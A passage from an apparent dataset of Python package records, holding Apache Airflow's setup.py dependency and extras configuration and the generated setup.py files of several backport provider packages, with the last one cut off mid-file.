    'requests_mock',
    'rich-click>=1.5',
    'semver',
    'towncrier',
    'twine',
    'wheel',
    'yamllint',
]

devel = cgroups + devel_only + doc + kubernetes + mypy_dependencies + mysql + pandas + password
devel_hadoop = devel + hdfs + hive + kerberos + presto + webhdfs

# Dict of all providers which are part of the Apache Airflow repository together with their requirements
PROVIDERS_REQUIREMENTS: Dict[str, List[str]] = {
    'airbyte': http_provider,
    'alibaba': alibaba,
    'amazon': amazon,
    'apache.beam': apache_beam,
    'apache.cassandra': cassandra,
    'apache.drill': drill,
    'apache.druid': druid,
    'apache.hdfs': hdfs,
    'apache.hive': hive,
    'apache.kylin': kylin,
    'apache.livy': http_provider,
    'apache.pig': [],
    'apache.pinot': pinot,
    'apache.spark': spark,
    'apache.sqoop': [],
    'arangodb': arangodb,
    'asana': asana,
    'celery': celery,
    'cloudant': cloudant,
    'cncf.kubernetes': kubernetes,
    'databricks': databricks,
    'datadog': datadog,
    'dbt.cloud': http_provider,
    'dingding': [],
    'discord': [],
    'docker': docker,
    'elasticsearch': elasticsearch,
    'exasol': exasol,
    'facebook': facebook,
    'ftp': [],
    'github': github,
    'google': google,
    'grpc': grpc,
    'hashicorp': hashicorp,
    'http': http,
    'imap': [],
    'influxdb': influxdb,
    'jdbc': jdbc,
    'jenkins': jenkins,
    'jira': jira,
    'microsoft.azure': azure,
    'microsoft.mssql': mssql,
    'microsoft.psrp': psrp,
    'microsoft.winrm': winrm,
    'mongo': mongo,
    'mysql': mysql,
    'neo4j': neo4j,
    'odbc': odbc,
    'openfaas': [],
    'opsgenie': opsgenie,
    'oracle': oracle,
    'pagerduty': pagerduty,
    'papermill': papermill,
    'plexus': plexus,
    'postgres': postgres,
    'presto': presto,
    'qubole': qubole,
    'redis': redis,
    'salesforce': salesforce,
    'samba': samba,
    'segment': segment,
    'sendgrid': sendgrid,
    'sftp': ssh,
    'singularity': singularity,
    'slack': slack,
    'snowflake': snowflake,
    'sqlite': [],
    'ssh': ssh,
    'tableau': tableau,
    'telegram': telegram,
    'trino': trino,
    'vertica': vertica,
    'yandex': yandex,
    'zendesk': zendesk,
}

# Those are all additional extras which do not have their own 'providers'
# The 'apache.atlas' and 'apache.webhdfs' are extras that provide additional libraries
# but they do not have separate providers (yet?), they are merely there to add extra libraries
# That can be used in custom python/bash operators.
ADDITIONAL_EXTRAS_REQUIREMENTS: Dict[str, List[str]] = {
    'apache.atlas': atlas,
    'apache.webhdfs': webhdfs,
}


# Those are extras that are extensions of the 'core' Airflow. They provide additional features
# To airflow core. They do not have separate providers because they do not have any operators/hooks etc.
CORE_EXTRAS_REQUIREMENTS: Dict[str, List[str]] = {
    'async': async_packages,
    'celery': celery,  # also has provider, but it extends the core with the CeleryExecutor
    'cgroups': cgroups,
    'cncf.kubernetes': kubernetes,  # also has provider, but it extends the core with the KubernetesExecutor
    'dask': dask,
    'deprecated_api': deprecated_api,
    'github_enterprise': flask_appbuilder_oauth,
    'google_auth': flask_appbuilder_oauth,
    'kerberos': kerberos,
    'ldap': ldap,
    'leveldb': leveldb,
    'pandas': pandas,
    'password': password,
    'rabbitmq': rabbitmq,
    'sentry': sentry,
    'statsd': statsd,
    'virtualenv': virtualenv,
}

EXTRAS_REQUIREMENTS: Dict[str, List[str]] = deepcopy(CORE_EXTRAS_REQUIREMENTS)


def add_extras_for_all_providers() -> None:
    """"""
    Adds extras for all providers.
    By default all providers have the same extra name as provider id, for example
    'apache.hive' extra has 'apache.hive' provider requirement.
    """"""
    for provider_name, provider_requirement in PROVIDERS_REQUIREMENTS.items():
        EXTRAS_REQUIREMENTS[provider_name] = provider_requirement


def add_additional_extras() -> None:
    """"""Adds extras for all additional extras.""""""
    for extra_name, extra_requirement in ADDITIONAL_EXTRAS_REQUIREMENTS.items():
        EXTRAS_REQUIREMENTS[extra_name] = extra_requirement


add_extras_for_all_providers()
add_additional_extras()

#############################################################################################################
#  The whole section can be removed in Airflow 3.0 as those old aliases are deprecated in 2.* series
#############################################################################################################

# Dictionary of aliases from 1.10 - deprecated in Airflow 2.*
EXTRAS_DEPRECATED_ALIASES: Dict[str, str] = {
    'atlas': 'apache.atlas',
    'aws': 'amazon',
    'azure': 'microsoft.azure',
    'cassandra': 'apache.cassandra',
    'crypto': '',  # All crypto requirements are installation requirements of core Airflow
    'druid': 'apache.druid',
    'gcp': 'google',
    'gcp_api': 'google',
    'hdfs': 'apache.hdfs',
    'hive': 'apache.hive',
    'kubernetes': 'cncf.kubernetes',
    'mssql': 'microsoft.mssql',
    'pinot': 'apache.pinot',
    'qds': 'qubole',
    's3': 'amazon',
    'spark': 'apache.spark',
    'webhdfs': 'apache.webhdfs',
    'winrm': 'microsoft.winrm',
}

EXTRAS_DEPRECATED_ALIASES_NOT_PROVIDERS: List[str] = [
    ""crypto"",
    ""webhdfs"",
]


def add_extras_for_all_deprecated_aliases() -> None:
    """"""
    Add extras for all deprecated aliases. Requirements for those deprecated aliases are the same
    as the extras they are replaced with.
    The requirements are not copies - those are the same lists as for the new extras. This is intended.
    Thanks to that if the original extras are later extended with providers, aliases are extended as well.
    """"""
    for alias, extra in EXTRAS_DEPRECATED_ALIASES.items():
        requirements = EXTRAS_REQUIREMENTS.get(extra) if extra != '' else []
        if requirements is None:
            raise Exception(f""The extra {extra} is missing for deprecated alias {alias}"")
        EXTRAS_REQUIREMENTS[alias] = requirements


def add_all_deprecated_provider_packages() -> None:
    """"""
    For deprecated aliases that are providers, we will swap the providers requirements to instead
    be the provider itself.

    e.g. {""kubernetes"": [""kubernetes>=3.0.0, <12.0.0"", ...]} becomes
    {""kubernetes"": [""apache-airflow-provider-cncf-kubernetes""]}
    """"""
    for alias, provider in EXTRAS_DEPRECATED_ALIASES.items():
        if alias in EXTRAS_DEPRECATED_ALIASES_NOT_PROVIDERS:
            continue
        replace_extra_requirement_with_provider_packages(alias, [provider])


add_extras_for_all_deprecated_aliases()

#############################################################################################################
#  End of deprecated section
#############################################################################################################

# This is list of all providers. It's a shortcut for anyone who would like to easily get list of
# All providers. It is used by pre-commits.
ALL_PROVIDERS = list(PROVIDERS_REQUIREMENTS.keys())

ALL_DB_PROVIDERS = [
    'apache.cassandra',
    'apache.drill',
    'apache.druid',
    'apache.hdfs',
    'apache.hive',
    'apache.pinot',
    'arangodb',
    'cloudant',
    'databricks',
    'exasol',
    'influxdb',
    'microsoft.mssql',
    'mongo',
    'mysql',
    'neo4j',
    'postgres',
    'presto',
    'trino',
    'vertica',
]

# Special requirements for all database-related providers. They are de-duplicated.
all_dbs = list({req for db_provider in ALL_DB_PROVIDERS for req in PROVIDERS_REQUIREMENTS[db_provider]})

# Requirements for all ""user"" extras (no devel). They are de-duplicated. Note that we do not need
# to separately add providers requirements - they have been already added as 'providers' extras above
_all_requirements = list({req for extras_reqs in EXTRAS_REQUIREMENTS.values() for req in extras_reqs})

# All user extras here
EXTRAS_REQUIREMENTS[""all""] = _all_requirements

# All db user extras here
EXTRAS_REQUIREMENTS[""all_dbs""] = all_dbs + pandas

# This can be simplified to devel_hadoop + _all_requirements due to inclusions
# but we keep it for explicit sake. We are de-duplicating it anyway.
devel_all = list(set(_all_requirements + doc + devel + devel_hadoop))

# Those are packages excluded for ""all"" dependencies
PACKAGES_EXCLUDED_FOR_ALL = []
PACKAGES_EXCLUDED_FOR_ALL.extend(
    [
        'snakebite',
    ]
)


def is_package_excluded(package: str, exclusion_list: List[str]) -> bool:
    """"""
    Checks if package should be excluded.

    :param package: package name (beginning of it)
    :param exclusion_list: list of excluded packages
    :return: true if package should be excluded
    """"""
    return any(package.startswith(excluded_package) for excluded_package in exclusion_list)


devel_all = [
    package
    for package in devel_all
    if not is_package_excluded(package=package, exclusion_list=PACKAGES_EXCLUDED_FOR_ALL)
]

devel_ci = devel_all


# Those are extras that we have to add for development purposes
# They can be use to install some predefined set of dependencies.
EXTRAS_REQUIREMENTS[""doc""] = doc
EXTRAS_REQUIREMENTS[""devel""] = devel  # devel already includes doc
EXTRAS_REQUIREMENTS[""devel_hadoop""] = devel_hadoop  # devel_hadoop already includes devel
EXTRAS_REQUIREMENTS[""devel_all""] = devel_all
EXTRAS_REQUIREMENTS[""devel_ci""] = devel_ci


def sort_extras_requirements() -> Dict[str, List[str]]:
    """"""
    The dictionary order remains when keys() are retrieved.
    Sort both: extras and list of dependencies to make it easier to analyse problems
    external packages will be first, then if providers are added they are added at the end of the lists.
    """"""
    sorted_requirements = dict(sorted(EXTRAS_REQUIREMENTS.items()))
    for extra_list in sorted_requirements.values():
        extra_list.sort()
    return sorted_requirements


EXTRAS_REQUIREMENTS = sort_extras_requirements()

# Those providers are pre-installed always when airflow is installed.
# Those providers do not have dependency on airflow2.0 because that would lead to circular dependencies.
# This is not a problem for PIP but some tools (pipdeptree) show those as a warning.
PREINSTALLED_PROVIDERS = [
    'ftp',
    'http',
    'imap',
    'sqlite',
]


def get_provider_package_from_package_id(package_id: str) -> str:
    """"""
    Builds the name of provider package out of the package id provided/

    :param package_id: id of the package (like amazon or microsoft.azure)
    :return: full name of package in PyPI
    """"""
    package_suffix = package_id.replace(""."", ""-"")
    return f""apache-airflow-providers-{package_suffix}""


def get_excluded_providers() -> List[str]:
    """"""Returns packages excluded for the current python version.""""""
    return []


def get_all_provider_packages() -> str:
    """"""Returns all provider packages configured in setup.py""""""
    excluded_providers = get_excluded_providers()
    return "" "".join(
        get_provider_package_from_package_id(package)
        for package in PROVIDERS_REQUIREMENTS
        if package not in excluded_providers
    )


class AirflowDistribution(Distribution):
    """"""The setuptools.Distribution subclass with Airflow specific behaviour""""""

    def __init__(self, attrs=None):
        super().__init__(attrs)
        self.install_requires = None

    def parse_config_files(self, *args, **kwargs) -> None:
        """"""
        Ensure that when we have been asked to install providers from sources
        that we don't *also* try to install those providers from PyPI.
        Also we should make sure that in this case we copy provider.yaml files so that
        Providers manager can find package information.
        """"""
        super().parse_config_files(*args, **kwargs)
        if os.getenv(INSTALL_PROVIDERS_FROM_SOURCES) == 'true':
            self.install_requires = [
                req for req in self.install_requires if not req.startswith('apache-airflow-providers-')
            ]
            provider_yaml_files = glob.glob(""airflow/providers/**/provider.yaml"", recursive=True)
            for provider_yaml_file in provider_yaml_files:
                provider_relative_path = relpath(provider_yaml_file, os.path.join(my_dir, ""airflow""))
                self.package_data['airflow'].append(provider_relative_path)
        else:
            self.install_requires.extend(
                [get_provider_package_from_package_id(package_id) for package_id in PREINSTALLED_PROVIDERS]
            )


def replace_extra_requirement_with_provider_packages(extra: str, providers: List[str]) -> None:
    """"""
    Replaces extra requirement with provider package. The intention here is that when
    the provider is added as dependency of extra, there is no need to add the dependencies
    separately. This is not needed and even harmful, because in case of future versions of
    the provider, the requirements might change, so hard-coding requirements from the version
    that was available at the release time might cause dependency conflicts in the future.

    Say for example that you have salesforce provider with those deps:

    { 'salesforce': ['simple-salesforce>=1.0.0', 'tableauserverclient'] }

    Initially ['salesforce'] extra has those requirements and it works like that when you install
    it when INSTALL_PROVIDERS_FROM_SOURCES is set to `true` (during the development). However, when
    the production installation is used, The dependencies are changed:

    { 'salesforce': ['apache-airflow-providers-salesforce'] }

    And then, 'apache-airflow-providers-salesforce' package has those 'install_requires' dependencies:
            ['simple-salesforce>=1.0.0', 'tableauserverclient']

    So transitively 'salesforce' extra has all the requirements it needs and in case the provider
    changes its dependencies, they will transitively change as well.

    In the constraint mechanism we save both - provider versions and it's dependencies
    version, which means that installation using constraints is repeatable.

    For K8s and Celery which are both ""Core executors"" and ""Providers"" we have to
    add the base dependencies to core as well, in order to mitigate problems where
    newer version of provider will have less strict limits. This should be done for both
    extras and their deprecated aliases. This is not a full protection however, the way
    extras work, this will not add ""hard"" limits for Airflow and the user who does not use
    constraints.

    :param extra: Name of the extra to add providers to
    :param providers: list of provider ids
    """"""
    if extra in ['cncf.kubernetes', 'kubernetes', 'celery']:
        EXTRAS_REQUIREMENTS[extra].extend(
            [get_provider_package_from_package_id(package_name) for package_name in providers]
        )
    else:
        EXTRAS_REQUIREMENTS[extra] = [
            get_provider_package_from_package_id(package_name) for package_name in providers
        ]


def add_provider_packages_to_extra_requirements(extra: str, providers: List[str]) -> None:
    """"""
    Adds provider packages as requirements to extra. This is used to add provider packages as requirements
    to the ""bulk"" kind of extras. Those bulk extras do not have the detailed 'extra' requirements as
    initial values, so instead of replacing them (see previous function) we can extend them.

    :param extra: Name of the extra to add providers to
    :param providers: list of provider ids
    """"""
    EXTRAS_REQUIREMENTS[extra].extend(
        [get_provider_package_from_package_id(package_name) for package_name in providers]
    )


def add_all_provider_packages() -> None:
    """"""
    In case of regular installation (providers installed from packages), we should add extra dependencies to
    Airflow - to get the providers automatically installed when those extras are installed.

    For providers installed from sources we skip that step. That helps to test and install airflow with
    all packages in CI - for example when new providers are added, otherwise the installation would fail
    as the new provider is not yet in PyPI.

    """"""
    for provider in ALL_PROVIDERS:
        replace_extra_requirement_with_provider_packages(provider, [provider])
    add_provider_packages_to_extra_requirements(""all"", ALL_PROVIDERS)
    add_provider_packages_to_extra_requirements(""devel_ci"", ALL_PROVIDERS)
    add_provider_packages_to_extra_requirements(""devel_all"", ALL_PROVIDERS)
    add_provider_packages_to_extra_requirements(""all_dbs"", ALL_DB_PROVIDERS)
    add_provider_packages_to_extra_requirements(
        ""devel_hadoop"", [""apache.hdfs"", ""apache.hive"", ""presto"", ""trino""]
    )
    add_all_deprecated_provider_packages()


class Develop(develop_orig):
    """"""Forces removal of providers in editable mode.""""""

    def run(self) -> None:  # type: ignore
        self.announce('Installing in editable mode. Uninstalling provider packages!', level=log.INFO)
        # We need to run ""python3 -m pip"" because it might be that older PIP binary is in the path
        # And it results with an error when running pip directly (cannot import pip module)
        # also PIP does not have a stable API so we have to run subprocesses ¯\_(ツ)_/¯
        try:
            installed_packages = (
                subprocess.check_output([""python3"", ""-m"", ""pip"", ""freeze""]).decode().splitlines()
            )
            airflow_provider_packages = [
                package_line.split(""="")[0]
                for package_line in installed_packages
                if package_line.startswith(""apache-airflow-providers"")
            ]
            self.announce(f'Uninstalling ${airflow_provider_packages}!', level=log.INFO)
            subprocess.check_call([""python3"", ""-m"", ""pip"", ""uninstall"", ""--yes"", *airflow_provider_packages])
        except subprocess.CalledProcessError as e:
            self.announce(f'Error when uninstalling airflow provider packages: {e}!', level=log.WARN)
        super().run()


class Install(install_orig):
    """"""Forces installation of providers from sources in editable mode.""""""

    def run(self) -> None:
        self.announce('Standard installation. Providers are installed from packages', level=log.INFO)
        super().run()


def do_setup() -> None:
    """"""
    Perform the Airflow package setup.

    Most values come from setup.cfg, only the dynamically calculated ones are passed to setup
    function call. See https://setuptools.readthedocs.io/en/latest/userguide/declarative_config.html
    """"""
    setup_kwargs = {}

    def include_provider_namespace_packages_when_installing_from_sources() -> None:
        """"""
        When installing providers from sources we install all namespace packages found below airflow,
        including airflow and provider packages, otherwise defaults from setup.cfg control this.
        The kwargs in setup() call override those that are specified in setup.cfg.
        """"""
        if os.getenv(INSTALL_PROVIDERS_FROM_SOURCES) == 'true':
            setup_kwargs['packages'] = find_namespace_packages(include=['airflow*'])

    include_provider_namespace_packages_when_installing_from_sources()
    if os.getenv(INSTALL_PROVIDERS_FROM_SOURCES) == 'true':
        print(""Installing providers from sources. Skip adding providers as dependencies"")
    else:
        add_all_provider_packages()

    write_version()
    setup(
        distclass=AirflowDistribution,
        version=version,
        extras_require=EXTRAS_REQUIREMENTS,
        download_url=('https://archive.apache.org/dist/airflow/' + version),
        cmdclass={
            'extra_clean': CleanCommand,
            'compile_assets': CompileAssets,
            'list_extras': ListExtras,
            'install': Install,  # type: ignore
            'develop': Develop,
        },
        test_suite='setup.airflow_test_suite',
        **setup_kwargs,  # type: ignore
    )


if __name__ == ""__main__"":
    do_setup()  # comment
",1
apache-airflow-backport-providers-amazon-2021.3.3,0,1,1,1,1,0,0,0,example_datasync_1.py example_datasync_2.py example_ecs_fargate.py example_emr_job_flow_automatic_steps.py example_emr_job_flow_manual_steps.py example_glacier_to_gcs.py example_google_api_to_s3_transfer_advanced.py example_google_api_to_s3_transfer_basic.py example_imap_attachment_to_s3.py example_s3_bucket.py example_s3_to_redshift.py __init__.py athena.py aws_dynamodb.py base_aws.py batch_client.py batch_waiters.json batch_waiters.py cloud_formation.py datasync.py dynamodb.py ec2.py elasticache_replication_group.py emr.py glacier.py glue.py glue_catalog.py glue_crawler.py kinesis.py lambda_function.py logs.py redshift.py s3.py sagemaker.py secrets_manager.py ses.py sns.py sqs.py step_function.py __init__.py cloudwatch_task_handler.py s3_task_handler.py __init__.py athena.py batch.py cloud_formation.py datasync.py ec2_start_instance.py ec2_stop_instance.py ecs.py emr_add_steps.py emr_create_job_flow.py emr_modify_cluster.py emr_terminate_job_flow.py glacier.py glue.py glue_crawler.py s3_bucket.py s3_copy_object.py s3_delete_objects.py s3_file_transform.py s3_list.py sagemaker_base.py sagemaker_endpoint.py sagemaker_endpoint_config.py sagemaker_model.py sagemaker_processing.py sagemaker_training.py sagemaker_transform.py sagemaker_tuning.py sns.py sqs.py step_function_get_execution_output.py step_function_start_execution.py __init__.py secrets_manager.py systems_manager.py __init__.py athena.py cloud_formation.py ec2_instance_state.py emr_base.py emr_job_flow.py emr_step.py glacier.py glue.py glue_catalog_partition.py glue_crawler.py redshift.py s3_key.py s3_keys_unchanged.py s3_prefix.py sagemaker_base.py sagemaker_endpoint.py sagemaker_training.py sagemaker_transform.py sagemaker_tuning.py sqs.py step_function_execution.py __init__.py dynamodb_to_s3.py exasol_to_s3.py gcs_to_s3.py glacier_to_gcs.py google_api_to_s3.py hive_to_dynamodb.py imap_attachment_to_s3.py mongo_to_s3.py mysql_to_s3.py redshift_to_s3.py s3_to_ftp.py s3_to_redshift.py s3_to_sftp.py sftp_to_s3.py __init__.py emailer.py redshift.py __init__.py __init__.py email.py typing_compat.py __init__.py __init__.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-backport-providers-amazon package.""""""

import logging
import os

from os.path import dirname
from setuptools import find_namespace_packages, setup

logger = logging.getLogger(__name__)

version = '2021.3.3'

my_dir = dirname(__file__)

try:
    with open(os.path.join(my_dir, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = ''


def do_setup():
    """"""Perform the package apache-airflow-backport-providers-amazon setup.""""""
    setup(
        name='apache-airflow-backport-providers-amazon',
        description='Backport provider package '
        'apache-airflow-backport-providers-amazon for Apache Airflow',
        long_description=long_description,
        long_description_content_type='text/markdown',
        license='Apache License 2.0',
        version=version,
        packages=find_namespace_packages(include=['airflow.providers.amazon', 'airflow.providers.amazon.*']),
        zip_safe=False,
        include_package_data=True,
        install_requires=[
            'apache-airflow~=1.10',
            'boto3>=1.15.0,<1.16.0',
            'botocore>=1.18.0,<1.19.0',
            'watchtower~=0.7.3',
        ],
        setup_requires=['setuptools', 'wheel'],
        extras_require={
            'apache.hive': ['apache-airflow-backport-providers-apache-hive'],
            'exasol': ['apache-airflow-backport-providers-exasol'],
            'ftp': ['apache-airflow-backport-providers-ftp'],
            'google': ['apache-airflow-backport-providers-google'],
            'imap': ['apache-airflow-backport-providers-imap'],
            'mongo': ['apache-airflow-backport-providers-mongo'],
            'mysql': ['apache-airflow-backport-providers-mysql'],
            'postgres': ['apache-airflow-backport-providers-postgres'],
            'ssh': ['apache-airflow-backport-providers-ssh'],
        },
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Environment :: Web Environment',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: Apache Software License',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Topic :: System :: Monitoring',
        ],
        author='Apache Software Foundation',
        author_email='dev@airflow.apache.org',
        url='https://airflow.apache.org/',
        download_url='https://archive.apache.org/dist/airflow/backport-providers',
        python_requires='~=3.6',
        project_urls={
            'Documentation': 'https://airflow.apache.org/docs/',
            'Bug Tracker': 'https://github.com/apache/airflow/issues',
            'Source Code': 'https://github.com/apache/airflow',
        },
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-backport-providers-cncf-kubernetes-2021.3.3,0,1,1,1,1,0,0,0,backwards_compat_converters.py __init__.py example_kubernetes.py example_spark_kubernetes.py example_spark_kubernetes_spark_pi.yaml __init__.py kubernetes.py __init__.py kubernetes_pod.py spark_kubernetes.py __init__.py spark_kubernetes.py __init__.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-backport-providers-cncf-kubernetes package.""""""

import logging
import os

from os.path import dirname
from setuptools import find_namespace_packages, setup

logger = logging.getLogger(__name__)

version = '2021.3.3'

my_dir = dirname(__file__)

try:
    with open(os.path.join(my_dir, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = ''


def do_setup():
    """"""Perform the package apache-airflow-backport-providers-cncf-kubernetes setup.""""""
    setup(
        name='apache-airflow-backport-providers-cncf-kubernetes',
        description='Backport provider package '
        'apache-airflow-backport-providers-cncf-kubernetes for Apache Airflow',
        long_description=long_description,
        long_description_content_type='text/markdown',
        license='Apache License 2.0',
        version=version,
        packages=find_namespace_packages(
            include=['airflow.providers.cncf.kubernetes', 'airflow.providers.cncf.kubernetes.*']
        ),
        zip_safe=False,
        include_package_data=True,
        install_requires=[
            'apache-airflow>=1.10.12, <2.0.0',
            'cryptography>=2.0.0',
            'kubernetes>=3.0.0, <12.0.0',
        ],
        setup_requires=['setuptools', 'wheel'],
        extras_require={},
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Environment :: Web Environment',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: Apache Software License',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Topic :: System :: Monitoring',
        ],
        author='Apache Software Foundation',
        author_email='dev@airflow.apache.org',
        url='https://airflow.apache.org/',
        download_url='https://archive.apache.org/dist/airflow/backport-providers',
        python_requires='~=3.6',
        project_urls={
            'Documentation': 'https://airflow.apache.org/docs/',
            'Bug Tracker': 'https://github.com/apache/airflow/issues',
            'Source Code': 'https://github.com/apache/airflow',
        },
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-backport-providers-http-2021.4.10,0,1,1,1,1,0,0,0,example_http.py __init__.py http.py __init__.py http.py __init__.py http.py __init__.py __init__.py dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-backport-providers-http package.""""""

import logging
import os

from os.path import dirname
from setuptools import find_namespace_packages, setup

logger = logging.getLogger(__name__)

version = '2021.4.10'

my_dir = dirname(__file__)

try:
    with open(os.path.join(my_dir, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = ''


def do_setup():
    """"""Perform the package apache-airflow-backport-providers-http setup.""""""
    setup(
        name='apache-airflow-backport-providers-http',
        description='Backport provider package ' 'apache-airflow-backport-providers-http for Apache Airflow',
        long_description=long_description,
        long_description_content_type='text/markdown',
        license='Apache License 2.0',
        version=version,
        packages=find_namespace_packages(include=['airflow.providers.http', 'airflow.providers.http.*']),
        zip_safe=False,
        include_package_data=True,
        install_requires=[],
        setup_requires=['setuptools', 'wheel'],
        extras_require={},
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Environment :: Web Environment',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: Apache Software License',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Topic :: System :: Monitoring',
        ],
        author='Apache Software Foundation',
        author_email='dev@airflow.apache.org',
        url='https://airflow.apache.org/',
        download_url='https://archive.apache.org/dist/airflow/backport-providers',
        python_requires='~=3.6',
        project_urls={
            'Documentation': 'https://airflow.apache.org/docs/',
            'Bug Tracker': 'https://github.com/apache/airflow/issues',
            'Source Code': 'https://github.com/apache/airflow',
        },
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-backport-providers-microsoft-azure-2021.3.13,0,1,1,1,1,0,1,0,__init CHANGELOG.txt LICENSE MANIFEST.in NOTICE PKG-INFO README.md README.rst,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-backport-providers-microsoft-azure package.""""""

import logging
import os

from os.path import dirname
from setuptools import find_namespace_packages, setup

logger = logging.getLogger(__name__)

version = '2021.3.13'

my_dir = dirname(__file__)

try:
    with open(os.path.join(my_dir, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = ''


def do_setup():
    """"""Perform the package apache-airflow-backport-providers-microsoft-azure setup.""""""
    setup(
        name='apache-airflow-backport-providers-microsoft-azure',
        description='Backport provider package '
        'apache-airflow-backport-providers-microsoft-azure for Apache Airflow',
        long_description=long_description,
        long_description_content_type='text/markdown',
        license='Apache License 2.0',
        version=version,
        packages=find_namespace_packages(
            include=['airflow.providers.microsoft.azure', 'airflow.providers.microsoft.azure.*']
        ),
        zip_safe=False,
        include_package_data=True,
        install_requires=[
            'apache-airflow~=1.10',
            'azure-batch>=8.0.0',
            'azure-cosmos>=3.0.1,<4',
            'azure-datalake-store>=0.0.45',
            'azure-identity>=1.3.1',
            'azure-keyvault>=4.1.0',
            'azure-kusto-data>=0.0.43,<0.1',
            'azure-mgmt-containerinstance>=1.5.0,<2.0',
            'azure-mgmt-datafactory>=1.0.0,<2.0',
            'azure-mgmt-datalake-store>=0.5.0',
            'azure-mgmt-resource>=2.2.0',
            'azure-storage-blob>=12.7.0',
            'azure-storage-common>=2.1.0',
            'azure-storage-file>=2.1.0',
        ],
        setup_requires=['setuptools', 'wheel'],
        extras_require={
            'google': ['apache-airflow-backport-providers-google'],
            'oracle': ['apache-airflow-backport-providers-oracle'],
        },
